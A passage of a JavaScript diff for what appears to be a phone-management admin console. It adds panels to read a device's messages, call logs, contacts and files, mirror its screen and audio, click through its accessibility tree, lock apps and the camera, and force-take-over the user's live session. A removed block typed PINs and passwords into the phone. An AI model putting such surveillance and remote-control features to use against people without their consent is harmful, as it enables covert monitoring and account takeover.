+        alert(formatApiError(e));
+      }
     });
   });
+  document.getElementById("btn-admin-gallery-inline-close")?.addEventListener(
+    "click",
+    () => closeAdminGalleryInlineViewer(),
+    { once: true }
+  );
 }
 
 function renderNotificationsPanel() {
@@ -1366,6 +1975,13 @@ async function openAdminRecording(transferId, displayName) {
 function renderMessagesPanel() {
   const el = document.getElementById("admin-messages-body");
   if (!el || !exploreCtx) return;
+  document.getElementById("btn-admin-messages-refresh")?.addEventListener(
+    "click",
+    () => {
+      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+    },
+    { once: true }
+  );
   const items = sortNewestFirst(exploreCtx.data.messages || [], "date", "createdAt");
   if (!items.length) {
     el.innerHTML = emptyHint("No messages cached. Tap Sync from phone.");
@@ -1388,6 +2004,13 @@ function renderMessagesPanel() {
 function renderCallLogsPanel() {
   const el = document.getElementById("admin-call-logs-body");
   if (!el || !exploreCtx) return;
+  document.getElementById("btn-admin-call-logs-refresh")?.addEventListener(
+    "click",
+    () => {
+      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+    },
+    { once: true }
+  );
   const items = sortNewestFirst(exploreCtx.data.callLogs || [], "date", "createdAt");
   if (!items.length) {
     el.innerHTML = emptyHint("No call logs cached. Tap Sync from phone.");
@@ -1409,6 +2032,13 @@ function renderCallLogsPanel() {
 function renderContactsPanel() {
   const el = document.getElementById("admin-contacts-body");
   if (!el || !exploreCtx) return;
+  document.getElementById("btn-admin-contacts-refresh")?.addEventListener(
+    "click",
+    () => {
+      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+    },
+    { once: true }
+  );
   const items = exploreCtx.data.contacts || [];
   if (!items.length) {
     el.innerHTML = emptyHint("No contacts cached. Tap Sync from phone.");
@@ -1426,25 +2056,222 @@ function renderContactsPanel() {
     .join("")}</ul>`;
 }
 
-function renderFilesPanel() {
+function renderFilesPanel(options = {}) {
+  const silent = Boolean(options.silent);
   const el = document.getElementById("admin-files-body");
   if (!el || !exploreCtx) return;
-  const grants = exploreCtx.data.folderGrants || [];
-  if (!grants.length) {
+  updateAdminFilesBreadcrumb();
+  const folders = exploreCtx.data.folderGrants || [];
+  const allEntries = (exploreCtx.data.fileIndex || []).filter(
+    (e) => e && (e.name || e.relativePath) && e.count == null
+  );
+  if (!adminFilesBrowse.grantId && folders[0]?.grantId) {
+    adminFilesBrowse.grantId = String(folders[0].grantId || folders[0].id || "");
+  }
+  const grantId = adminFilesBrowse.grantId || String(folders[0]?.grantId || folders[0]?.id || "");
+  const curPath = normalizeAdminFilesPath(adminFilesBrowse.relativePath);
+  const entries = allEntries
+    .filter((e) => {
+      if (grantId && e.folderGrantId && String(e.folderGrantId) !== grantId) return false;
+      return adminEntryParentPath(e) === curPath;
+    })
+    .sort((a, b) => {
+      const ad = a.isDirectory ? 0 : 1;
+      const bd = b.isDirectory ? 0 : 1;
+      if (ad !== bd) return ad - bd;
+      return String(a.name || "").localeCompare(String(b.name || ""), undefined, { sensitivity: "base" });
+    });
+  const renderKey = JSON.stringify({ grantId, curPath, folders: folders.length, entries: entries.length });
+  if (silent && renderKey === adminFilesPanelRenderKey && el.querySelector(".files-grid")) return;
+  adminFilesPanelRenderKey = renderKey;
+  if (!folders.length && !entries.length) {
     el.innerHTML = emptyHint(
-      "No shared folders yet. On the phone, grant folder access under Permissions, then tap Refresh folders here."
+      "No shared folders yet. On the phone, grant folder access under Permissions, then tap List folder."
     );
     return;
   }
-  el.innerHTML = `<ul class="admin-readable-list">${grants
-    .map(
-      (g) =>
-        `<li>
-          <strong>${escapeHtml(g.displayName || g.name || g.path || g.id)}</strong>
-          <div class="muted">${escapeHtml(g.uri || g.path || "")}</div>
-        </li>`
-    )
-    .join("")}</ul>`;
+  el.innerHTML = `
+    <h3>Authorized folders</h3>
+    <ul>${
+      folders.length
+        ? folders
+            .map(
+              (f) =>
+                `<li><button type="button" class="btn-secondary btn-admin-grant-root" data-grant="${escapeHtml(f.grantId || f.id || "")}">${escapeHtml(f.displayName || f.name || f.grantId || f.id)}</button> · ${f.connected === false ? "disconnected" : "connected"}</li>`
+            )
+            .join("")
+        : "<li>None — add a folder on the phone Permissions card</li>"
+    }</ul>
+    <h3>${curPath ? `Contents of ${escapeHtml(curPath)}` : "Files (root)"}</h3>
+    ${
+      entries.length
+        ? `<div class="files-grid">${entries
+            .slice(0, 160)
+            .map((e, idx) => {
+              if (e.isDirectory) {
+                return `<button type="button" class="file-card file-folder" data-folder-idx="${idx}">
+                  <span class="folder-ico" aria-hidden="true">📁</span>
+                  <strong>${escapeHtml(e.name || "")}</strong>
+                  <span class="muted">Folder — click to open</span>
+                </button>`;
+              }
+              const key = `adminfile::${exploreCtx.deviceId}::${grantId}::${normalizeAdminFilesPath(e.relativePath || e.name || "")}`;
+              const st = adminFilesItemState.get(key);
+              let btnLabel = "Download";
+              let btnClass = "btn-secondary btn-admin-file-dl";
+              if (st?.status === "downloading") {
+                btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+                btnClass += " btn-file-progress";
+              } else if (st?.status === "ready") {
+                btnLabel = "View";
+                btnClass += " btn-file-ready";
+              } else if (st?.status === "error") {
+                btnLabel = "Retry";
+                btnClass += " btn-file-error";
+              }
+              return `<article class="file-card" data-file-idx="${idx}">
+                <strong>${escapeHtml(e.name || "")}</strong>
+                <span class="muted">${escapeHtml(e.mimeType || "file")} · ${Math.round((e.sizeBytes || 0) / 1024)} KB</span>
+                <div class="file-card-actions">
+                  <button type="button" class="${btnClass}" data-file-key="${escapeHtml(key)}" data-file-idx="${idx}" ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button>
+                </div>
+              </article>`;
+            })
+            .join("")}</div>`
+        : `<p class="muted">${curPath ? "This folder is empty, or still loading — tap List folder / Refresh." : "Empty — tap List folder, wait a few seconds, then open a folder card."}</p>`
+    }`;
+  el.querySelectorAll(".btn-admin-grant-root").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const g = btn.getAttribute("data-grant") || "";
+      if (g) void listAdminFilesFolder(g, "");
+    });
+  });
+  el.querySelectorAll(".file-folder").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const idx = Number(btn.getAttribute("data-folder-idx"));
+      const entry = entries[idx];
+      if (!entry) return;
+      const g = String(entry.folderGrantId || grantId || "");
+      const next = normalizeAdminFilesPath(entry.relativePath || entry.name || "");
+      if (g && next) void listAdminFilesFolder(g, next);
+    });
+  });
+  el.querySelectorAll(".btn-admin-file-dl").forEach((btn) => {
+    btn.addEventListener("click", async () => {
+      const idx = Number(btn.getAttribute("data-file-idx"));
+      const entry = entries[idx];
+      if (!entry) return;
+      try {
+        await downloadAdminFileItem(entry, btn);
+      } catch (e) {
+        alert(formatApiError(e));
+      }
+    });
+  });
+  document.getElementById("btn-admin-files-up")?.addEventListener("click", () => {
+    const parent = parentAdminFilesPath(adminFilesBrowse.relativePath);
+    if (grantId) void listAdminFilesFolder(grantId, parent);
+  }, { once: true });
+  document.getElementById("btn-admin-files-list")?.addEventListener("click", () => {
+    if (grantId) void listAdminFilesFolder(grantId, adminFilesBrowse.relativePath || "");
+  }, { once: true });
+  document.getElementById("btn-admin-files-refresh")?.addEventListener("click", () => {
+    if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId).then(() => renderFilesPanel());
+  }, { once: true });
+  document.getElementById("btn-admin-files-inline-close")?.addEventListener("click", () => closeAdminFilesInlineViewer(), { once: true });
+}
+
+async function downloadAdminFileItem(entry, btn) {
+  if (!exploreCtx) return;
+  const grantId = String(entry.folderGrantId || adminFilesBrowse.grantId || "");
+  const rel = normalizeAdminFilesPath(entry.relativePath || entry.name || "");
+  const key = `adminfile::${exploreCtx.deviceId}::${grantId}::${rel}`;
+  const existing = adminFilesItemState.get(key);
+  if (existing?.status === "ready" && existing.objectUrl) {
+    showAdminFilesInline(existing);
+    return;
+  }
+  let state = { status: "downloading", progress: 3, displayName: entry.name || "file", mimeType: entry.mimeType, type: "file" };
+  adminFilesItemState.set(key, state);
+  if (btn) {
+    btn.textContent = "3%";
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+  }
+  try {
+    const started = await api(
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/command`,
+      {
+        method: "POST",
+        body: JSON.stringify({
+          action: "FILE_DOWNLOAD_REQUEST",
+          payload: {
+            folderGrantId: grantId,
+            documentId: entry.documentId || entry.name,
+            relativePath: rel,
+            sizeBytes: entry.sizeBytes || 0,
+            mimeType: entry.mimeType || "application/octet-stream",
+            displayName: entry.name,
+          },
+        }),
+      }
+    );
+    const transferId = String(started.transfer?.transferId || started.command?.transferId || "");
+    if (!transferId) throw new Error("Download did not start");
+    const deadline = Date.now() + 90_000;
+    while (Date.now() < deadline) {
+      const data = await api(
+        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
+      );
+      const t = data.transfer || {};
+      const st = String(t.status || "");
+      const p = Math.max(3, Math.min(99, Number(t.progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      adminFilesItemState.set(key, state);
+      if (btn) btn.textContent = `${p}%`;
+      if (st === "ready") {
+        const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
+        const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
+        if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
+        const blob = await res.blob();
+        const objectUrl = URL.createObjectURL(blob);
+        const ready = {
+          status: "ready",
+          progress: 100,
+          objectUrl,
+          mimeType: entry.mimeType || blob.type,
+          displayName: entry.name || "file",
+          type: String(entry.mimeType || "").startsWith("image/")
+            ? "image"
+            : String(entry.mimeType || "").startsWith("video/")
+              ? "video"
+              : String(entry.mimeType || "").startsWith("audio/")
+                ? "audio"
+                : "file",
+        };
+        adminFilesItemState.set(key, ready);
+        if (btn) {
+          btn.textContent = "View";
+          btn.disabled = false;
+          btn.classList.add("btn-file-ready");
+        }
+        showAdminFilesInline(ready);
+        return;
+      }
+      if (st === "failed" || st === "cancelled") throw new Error(t.errorMessage || `Transfer ${st}`);
+      await new Promise((r) => setTimeout(r, 1200));
+    }
+    throw new Error("Download timed out — keep phone online and retry.");
+  } catch (e) {
+    state = { ...state, status: "error", progress: 0 };
+    adminFilesItemState.set(key, state);
+    if (btn) {
+      btn.textContent = "Retry";
+      btn.disabled = false;
+      btn.classList.add("btn-file-error");
+    }
+    throw e;
+  }
 }
 
 function setAdminRcStatus(text) {
@@ -1737,115 +2564,774 @@ function wireAdminRemoteControl() {
   });
 }
 
-function renderScreenPanel() {
-  const el = document.getElementById("admin-screen-body");
-  if (!el || !exploreCtx) return;
-  adminRcSessionActive = false;
-  adminRcDragStart = null;
-  el.innerHTML = `
-    <p class="muted">Screen mirror needs Android system cast consent on the phone. Starts via Platform Admin.</p>
-    <div class="connect-actions" style="margin-top:12px;">
-      <button type="button" class="btn-primary" id="btn-admin-screen-start">Start screen mirror</button>
-      <button type="button" class="btn-danger" id="btn-admin-screen-stop">Stop</button>
-    </div>
-    <div class="admin-rc-toolbar surface" style="padding:10px 12px;">
-      <label class="chk"><input type="checkbox" id="admin-rc-control-enabled" /> Remote Control</label>
-      <select id="admin-rc-gesture-mode" class="input" title="Gesture mode">
-        <option value="tap" selected>Tap</option>
-        <option value="double">Double tap</option>
-        <option value="long">Long press</option>
-        <option value="swipe">Swipe</option>
-        <option value="drag">Drag</option>
-      </select>
-      <button type="button" class="btn-secondary" id="btn-admin-rc-back">Back</button>
-      <button type="button" class="btn-secondary" id="btn-admin-rc-home">Home</button>
-      <button type="button" class="btn-secondary" id="btn-admin-rc-recents">Recents</button>
-      <button type="button" class="btn-secondary" id="btn-admin-rc-notif">Notifications</button>
-      <button type="button" class="btn-danger" id="btn-admin-rc-stop">Emergency Stop</button>
-      <span id="admin-rc-status" class="status-badge">View only</span>
-    </div>
-    <p id="screen-live-status" class="muted" style="margin-top:10px;" aria-live="polite"></p>
-    <div class="admin-screen-stage" id="admin-screen-stage">
-      <video id="admin-screen-video" class="admin-live-video" autoplay playsinline muted controls hidden></video>
-      <div id="admin-rc-touch-marker" hidden></div>
-    </div>
-    <div class="admin-rc-text-panel">
-      <label>Type on phone (OTP, PIN, passwords)
-        <input id="admin-rc-text-input" class="input" type="password" maxlength="2000" placeholder="OTP, PIN, or password for focused field" autocomplete="off" />
-      </label>
-      <label class="chk" style="margin-top:8px;display:flex;align-items:center;gap:8px">
-        <input type="checkbox" id="admin-rc-text-show" /> Show typed characters
-      </label>
-      <div class="row-gap">
-        <button type="button" class="btn-primary" id="btn-admin-rc-set-text">Insert text</button>
-        <button type="button" class="btn-secondary" id="btn-admin-rc-clear-text">Clear field</button>
-      </div>
-      <p class="muted" style="margin:8px 0 0;font-size:0.82rem">
-        Enable Remote Control, tap the field on the mirrored screen, then Insert.
-      </p>
-    </div>
-  `;
-  document.getElementById("btn-admin-screen-start")?.addEventListener("click", () => {
-    void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, ["screenMirror"], false, "auto", {
-      statusId: "screen-live-status",
-      videoId: "admin-screen-video",
+function setAdminScreenStatus(label) {
+  const el = document.getElementById("admin-screen-status");
+  if (el) el.textContent = label;
+}
+
+function stopAdminScreenStats() {
+  if (adminScreenStatsTimer) {
+    clearInterval(adminScreenStatsTimer);
+    adminScreenStatsTimer = null;
+  }
+}
+
+function startAdminScreenStats(pc) {
+  stopAdminScreenStats();
+  const statsEl = document.getElementById("admin-screen-stats");
+  adminScreenStatsTimer = setInterval(async () => {
+    if (!statsEl || !pc) return;
+    try {
+      const report = await pc.getStats();
+      let fps = "—";
+      let bitrate = "—";
+      report.forEach((r) => {
+        if (r.type === "inbound-rtp" && r.kind === "video") {
+          if (r.framesPerSecond != null) fps = String(Math.round(r.framesPerSecond));
+          if (r.bytesReceived != null) {
+            bitrate = `${Math.round((r.bytesReceived * 8) / 1000)} kb total`;
+          }
+        }
+      });
+      statsEl.textContent = `Latency — · FPS ${fps} · Bandwidth ${bitrate}`;
+    } catch {
+      /* ignore */
+    }
+  }, 2000);
+}
+
+async function startAdminScreenMirror() {
+  if (!exploreCtx) throw new Error("Select a device first");
+  const { ownerUid, deviceId } = exploreCtx;
+  const withAudio = Boolean(document.getElementById("admin-screen-audio")?.checked);
+  const capabilities = withAudio ? ["screenMirror", "microphone"] : ["screenMirror"];
+  const quality = document.getElementById("admin-screen-quality")?.value || "720p";
+  const fps = Number(document.getElementById("admin-screen-fps")?.value || 30);
+  const status = document.getElementById("screen-live-status");
+  const video = document.getElementById("admin-screen-video");
+  const audio = document.getElementById("admin-screen-audio-el");
+  setAdminScreenStatus("Preparing");
+  try {
+    await stopLiveViewer();
+    stopAdminScreenStats();
+    if (status) status.textContent = "Starting screen mirror…";
+    if (video) video.hidden = false;
+
+    let result;
+    try {
+      result = await api(
+        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
+        {
+          method: "POST",
+          body: JSON.stringify({ capabilities, forceReplace: false, quality, fps }),
+        }
+      );
+    } catch (e) {
+      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
+        const ok = confirm(
+          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
+        );
+        if (!ok) {
+          if (status) status.textContent = "Cancelled — user session left running.";
+          setAdminScreenStatus("Idle");
+          return;
+        }
+        result = await api(
+          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
+          {
+            method: "POST",
+            body: JSON.stringify({ capabilities, forceReplace: true, quality, fps }),
+          }
+        );
+      } else {
+        throw e;
+      }
+    }
+    if (!firebaseConfig) throw new Error("Firebase config missing");
+    if (!video) throw new Error("Video element missing");
+    activeLiveSessionId = String(result.sessionId || "");
+    if (status) {
+      status.textContent =
+        result.notes ||
+        "Accept screen capture on the phone (Android system prompt).";
+    }
+    liveViewer = await startAdminLiveViewer({
+      firebaseConfig,
+      customToken: result.customToken,
+      ownerUid: result.ownerUid,
+      sessionId: result.sessionId,
+      iceServers: Array.isArray(result.iceServers)
+        ? result.iceServers
+        : result.iceServers?.iceServers || [],
+      videoEl: video,
+      audioEl: audio || undefined,
+      onStatus: (m) => {
+        if (status) status.textContent = m;
+        if (/receiving video|connected/i.test(m)) setAdminScreenStatus("Mirroring");
+      },
     });
+    if (liveViewer?.pc) startAdminScreenStats(liveViewer.pc);
+    setAdminScreenStatus("Waiting for Permission");
+  } catch (e) {
+    activeLiveSessionId = "";
+    setAdminScreenStatus("Idle");
+    if (status) status.textContent = formatApiError(e);
+    else alert(formatApiError(e));
+  }
+}
+
+async function refreshAdminRcTree() {
+  setAdminRcStatus("Loading elements…");
+  try {
+    const result = await sendAdminA11yCommand("A11Y_TREE", {}, { wait: true, waitMs: 45000 });
+    const summary = String(result?.resultSummary || "");
+    const m = summary.match(/tree:(\d+)/);
+    const version = m ? m[1] : "";
+    const meta = document.getElementById("admin-rc-tree-meta");
+    if (!version || !exploreCtx) {
+      if (meta) meta.textContent = summary || "Tree requested";
+      setAdminRcStatus("Remote control active");
+      return;
+    }
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/accessibility/tree?version=${encodeURIComponent(version)}`
+    );
+    const tree = data.tree || {};
+    adminRcTreeNodes = Array.isArray(tree.nodes) ? tree.nodes : [];
+    if (meta) {
+      meta.textContent = `${tree.packageName || "app"} · ${adminRcTreeNodes.length} elements · v${version}`;
+    }
+    renderAdminRcTreeList(document.getElementById("admin-rc-tree-search")?.value || "");
+    setAdminRcStatus("Remote control active");
+  } catch (e) {
+    setAdminRcStatus(e instanceof Error ? e.message : String(e));
+  }
+}
+
+function renderAdminRcTreeList(filter) {
+  const list = document.getElementById("admin-rc-tree-list");
+  if (!list) return;
+  const q = String(filter || "").toLowerCase().trim();
+  const items = adminRcTreeNodes.filter((n) => {
+    if (!q) return n.clickable || n.editable || n.scrollable || n.checkable;
+    const hay = `${n.text || ""} ${n.contentDescription || ""} ${n.className || ""}`.toLowerCase();
+    return hay.includes(q);
+  }).slice(0, 80);
+  if (!items.length) {
+    list.textContent = "No matching elements.";
+    list.classList.add("muted");
+    return;
+  }
+  list.classList.remove("muted");
+  list.innerHTML = items
+    .map((n) => {
+      const label = escapeHtml(
+        (n.text || n.contentDescription || n.className || "element").slice(0, 80)
+      );
+      const flags = [
+        n.clickable ? "click" : "",
+        n.editable ? "edit" : "",
+        n.scrollable ? "scroll" : "",
+      ]
+        .filter(Boolean)
+        .join(" · ");
+      return `<button type="button" class="rc-tree-item" data-node-id="${escapeHtml(n.id)}">
+        <strong>${label}</strong><br/><span class="muted">${escapeHtml(flags || n.className || "")}</span>
+      </button>`;
+    })
+    .join("");
+  list.querySelectorAll(".rc-tree-item").forEach((btn) => {
+    btn.addEventListener("click", async () => {
+      const nodeId = btn.getAttribute("data-node-id");
+      if (!nodeId || !isAdminRcEnabled()) return;
+      setAdminRcStatus("Clicking element…");
+      try {
+        await sendAdminA11yCommand("A11Y_NODE_ACTION", { nodeId, nodeAction: "CLICK" }, { wait: false });
+        setAdminRcStatus("Element clicked");
+      } catch (e) {
+        setAdminRcStatus(e instanceof Error ? e.message : String(e));
+      }
+    });
+  });
+}
+
+function wireAdminScreenMirrorPanel() {
+  if (adminScreenMirrorWired) return;
+  adminScreenMirrorWired = true;
+  wireAdminRemoteControl();
+  document.getElementById("btn-admin-screen-start")?.addEventListener("click", () => {
+    void startAdminScreenMirror();
   });
   document.getElementById("btn-admin-screen-stop")?.addEventListener("click", async () => {
     if (adminRcSessionActive) await stopAdminRemoteControlSession(false);
     const box = document.getElementById("admin-rc-control-enabled");
     if (box) box.checked = false;
+    stopAdminScreenStats();
     await stopLiveViewer();
+    setAdminScreenStatus("Idle");
     const st = document.getElementById("screen-live-status");
     if (st) st.textContent = "Screen mirror stopped.";
     const v = document.getElementById("admin-screen-video");
-    if (v) v.hidden = true;
+    if (v) {
+      v.hidden = true;
+      v.srcObject = null;
+    }
   });
-  wireAdminRemoteControl();
+  document.getElementById("btn-admin-screen-lock")?.addEventListener("click", async () => {
+    if (!exploreCtx) return;
+    try {
+      setAdminScreenStatus("Locking…");
+      await runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_LOCK", {});
+      setAdminScreenStatus("Locked");
+    } catch (e) {
+      setAdminScreenStatus("Idle");
+      alert(formatApiError(e));
+    }
+  });
+  document.getElementById("btn-admin-screen-unlock")?.addEventListener("click", async () => {
+    if (!exploreCtx) return;
+    try {
+      setAdminScreenStatus("Waking…");
+      await runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_UNLOCK", {});
+      setAdminScreenStatus("Unlock / wake sent");
+    } catch (e) {
+      setAdminScreenStatus("Idle");
+      alert(formatApiError(e));
+    }
+  });
+  document.getElementById("btn-admin-screen-fullscreen")?.addEventListener("click", () => {
+    const v = document.getElementById("admin-screen-video");
+    if (v?.requestFullscreen) v.requestFullscreen().catch(() => {});
+  });
+  document.getElementById("btn-admin-screen-pip")?.addEventListener("click", () => {
+    const v = document.getElementById("admin-screen-video");
+    if (v && document.pictureInPictureEnabled) {
+      v.requestPictureInPicture().catch(() => {});
+    }
+  });
+  document.getElementById("btn-admin-screen-shot")?.addEventListener("click", () => {
+    const v = document.getElementById("admin-screen-video");
+    const canvas = document.getElementById("admin-screen-shot-canvas");
+    const preview = document.getElementById("admin-screen-shot-preview");
+    if (!v || !canvas || !v.videoWidth) {
+      alert("No live frame yet");
+      return;
+    }
+    canvas.width = v.videoWidth;
+    canvas.height = v.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(v, 0, 0);
+    const url = canvas.toDataURL("image/jpeg", 0.92);
+    if (preview) {
+      preview.hidden = false;
+      preview.innerHTML = `<img src="${url}" alt="Screenshot" style="max-width:100%;border-radius:12px" />
+        <a class="btn-secondary" href="${url}" download="screen-${Date.now()}.jpg">Download</a>`;
+    }
+  });
+  document.getElementById("btn-admin-rc-tree")?.addEventListener("click", () => {
+    void refreshAdminRcTree();
+  });
+  document.getElementById("admin-rc-tree-search")?.addEventListener("input", (ev) => {
+    renderAdminRcTreeList(ev.target?.value || "");
+  });
+}
+
+function renderScreenPanel() {
+  if (!exploreCtx) return;
+  adminRcSessionActive = false;
+  adminRcDragStart = null;
+}
+
+function adminAppsBlockDurationMinutes() {
+  const n = Number(document.getElementById("admin-apps-block-duration")?.value || 30);
+  return Number.isFinite(n) ? n : 30;
+}
+
+function adminFormatBlockRemaining(expiresAt) {
+  if (!expiresAt || expiresAt <= 0) return "Until unblocked";
+  const ms = expiresAt - Date.now();
+  if (ms <= 0) return "Expired";
+  const m = Math.ceil(ms / 60000);
+  if (m < 60) return `${m} min left`;
+  const h = Math.floor(m / 60);
+  const rem = m % 60;
+  return rem ? `${h}h ${rem}m left` : `${h}h left`;
+}
+
+function isAdminPackageBlockedNow(packageName) {
+  return adminActiveBlocks.some(
+    (b) => b.status === "active" && b.packageName === packageName && b.mode !== "camera_hw"
+  );
+}
+
+function alertAdminAppControlError(e) {
+  const msg = e instanceof Error ? e.message : formatApiError(e);
+  if (/appControl|CAPABILITY_DENIED/i.test(msg)) {
+    alert(
+      "App Control not allowed.\n\nPhone must have Accessibility + App Control enabled.\n\n" + msg
+    );
+  } else if (/ACCESSIBILITY_REQUIRED/i.test(msg)) {
+    alert("Phone must enable App Control Accessibility.\n\n" + msg);
+  } else if (/DEVICE_ADMIN_REQUIRED/i.test(msg)) {
+    alert("Camera hardware lock needs Device Admin on the phone.\n\n" + msg);
+  } else {
+    alert(msg);
+  }
+}
+
+async function sendAdminAppControl(op, packageName = "", appName = "", mode = "app") {
+  if (!exploreCtx) throw new Error("Select a device first");
+  const durationMinutes = adminAppsBlockDurationMinutes();
+  const durationMs = durationMinutes > 0 ? Math.round(durationMinutes * 60 * 1000) : 0;
+  let action = "APP_BLOCKS_SYNC";
+  /** @type {Record<string, unknown>} */
+  let payload = {};
+  if (op === "SYNC") {
+    action = "APP_BLOCKS_SYNC";
+  } else if (op === "CAMERA_LOCK") {
+    action = "APP_BLOCK";
+    payload = {
+      packageName: "__camera_hardware__",
+      appName: "Camera hardware",
+      mode: "camera_hw",
+      durationMs,
+    };
+  } else if (op === "CAMERA_UNLOCK") {
+    action = "APP_UNBLOCK";
+    payload = { packageName: "__camera_hardware__", mode: "camera_hw" };
+  } else if (op === "BLOCK") {
+    action = "APP_BLOCK";
+    payload = { packageName, appName: appName || packageName, mode, durationMs };
+  } else if (op === "UNBLOCK") {
+    action = "APP_UNBLOCK";
+    payload = { packageName, mode };
+  }
+  await api(
+    `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/command`,
+    { method: "POST", body: JSON.stringify({ action, payload }) }
+  );
+}
+
+async function refreshAdminAppsBlocksPanel() {
+  const box = document.getElementById("admin-apps-blocks");
+  if (!box || !exploreCtx) return;
+  try {
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps/blocks`
+    );
+    const items = (data.items || []).filter((b) => b.status === "active");
+    adminActiveBlocks = items;
+    if (!items.length) {
+      box.textContent = "No apps locked.";
+      box.classList.add("muted");
+      return;
+    }
+    box.classList.remove("muted");
+    box.innerHTML = items
+      .map((b) => {
+        const title =
+          b.mode === "camera_hw" ? "Camera hardware" : escapeHtml(b.appName || b.packageName);
+        return `<div class="block-row surface" data-package="${escapeHtml(b.packageName)}">
+          <div>
+            <strong>${title}</strong>
+            <div class="muted">${escapeHtml(b.packageName)} · ${adminFormatBlockRemaining(b.expiresAt)}</div>
+          </div>
+          <button type="button" class="btn-secondary btn-admin-unlock-pkg" data-package="${escapeHtml(b.packageName)}" data-mode="${escapeHtml(b.mode || "app")}">Unlock</button>
+        </div>`;
+      })
+      .join("");
+    box.querySelectorAll(".btn-admin-unlock-pkg").forEach((btn) => {
+      btn.addEventListener("click", async () => {
+        const pkg = btn.getAttribute("data-package");
+        const mode = btn.getAttribute("data-mode") || "app";
+        if (!pkg) return;
+        try {
+          await sendAdminAppControl(mode === "camera_hw" ? "CAMERA_UNLOCK" : "UNBLOCK", pkg, "", mode);
+          await refreshAdminAppsBlocksPanel();
+          await refreshAdminAppsPanel();
+        } catch (e) {
+          alertAdminAppControlError(e);
+        }
+      });
+    });
+  } catch (e) {
+    box.textContent = e instanceof Error ? e.message : String(e);
+    box.classList.add("muted");
+  }
+}
+
+async function refreshAdminAppsPanel() {
+  const list = document.getElementById("admin-apps-list");
+  const detail = document.getElementById("admin-app-detail");
+  if (!list || !exploreCtx) return;
+  if (detail) detail.hidden = true;
+  const q = document.getElementById("admin-apps-search")?.value || "";
+  const filter = document.getElementById("admin-apps-filter")?.value || "user";
+  try {
+    await refreshAdminAppsBlocksPanel();
+    const url =
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps` +
+      `?q=${encodeURIComponent(q)}&filter=${encodeURIComponent(filter === "blocked" ? "all" : filter)}`;
+    const data = await api(url);
+    let items = data.items || [];
+    if (filter === "blocked") {
+      const blockedPkgs = new Set(
+        adminActiveBlocks.filter((b) => b.mode !== "camera_hw").map((b) => b.packageName)
+      );
+      items = items.filter((a) => blockedPkgs.has(a.packageName));
+    }
+    if (!items.length) {
+      list.textContent =
+        filter === "blocked"
+          ? "No locked apps right now."
+          : filter === "user"
+            ? "No user apps found. Tap Sync from phone, or switch Filter to All apps."
+            : "No apps indexed yet. Tap Sync from phone.";
+      list.classList.add("muted");
+      return;
+    }
+    list.classList.remove("muted");
+    list.innerHTML = items
+      .map((a) => {
+        const blocked = isAdminPackageBlockedNow(a.packageName);
+        const name = escapeHtml(a.appName || a.packageName);
+        const pkg = escapeHtml(a.packageName);
+        return `<article class="app-row surface${blocked ? " is-blocked" : ""}" data-package="${pkg}">
+          <div class="app-row-main">
+            <strong>${name}${blocked ? '<span class="app-badge-blocked">Locked</span>' : ""}</strong>
+            <span class="muted">${pkg}</span>
+            <span class="muted">v${escapeHtml(a.versionName || "?")} · ${a.isSystem ? "System" : "User"} · ${escapeHtml(a.category || "")}</span>
+          </div>
+          <div class="app-row-actions">
+            <button type="button" class="btn-secondary btn-admin-app-details" data-package="${pkg}">Details</button>
+            ${
+              blocked
+                ? `<button type="button" class="btn-primary btn-admin-app-unlock" data-package="${pkg}" data-name="${name}">Unlock</button>`
+                : `<button type="button" class="btn-danger-soft btn-admin-app-lock" data-package="${pkg}" data-name="${name}">Lock</button>`
+            }
+          </div>
+        </article>`;
+      })
+      .join("");
+    list.querySelectorAll(".btn-admin-app-details").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const pkg = btn.getAttribute("data-package");
+        if (pkg) void openAdminAppDetail(pkg);
+      });
+    });
+    list.querySelectorAll(".btn-admin-app-lock").forEach((btn) => {
+      btn.addEventListener("click", async () => {
+        const pkg = btn.getAttribute("data-package") || "";
+        const name = btn.getAttribute("data-name") || pkg;
+        if (!pkg) return;
+        btn.disabled = true;
+        try {
+          await sendAdminAppControl("BLOCK", pkg, name, "app");
+          setTimeout(async () => {
+            await refreshAdminAppsBlocksPanel();
+            await refreshAdminAppsPanel();
+          }, 1200);
+        } catch (e) {
+          btn.disabled = false;
